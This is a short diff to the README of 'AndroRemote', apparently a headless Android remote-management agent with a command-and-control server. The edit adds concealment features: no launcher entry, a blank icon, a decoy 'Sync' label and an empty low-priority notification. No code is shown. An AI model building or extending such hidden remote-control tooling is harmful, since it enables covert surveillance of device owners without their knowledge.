@@ -1,6 +1,6 @@
 # AndroRemote
 
-Headless Android 15 remote-management agent + C2 server. APK has **no GUI**: no launcher icon, no recents entry — everything driven from a terminal.
+Headless Android 15 remote-management agent + C2 server. APK has **no GUI and is hidden**: no launcher entry, blank app icon, `Sync` label, blank notification icon with an empty IMPORTANCE_MIN notification — everything driven from a terminal.
 
 Two channels, both always active when configured:
 
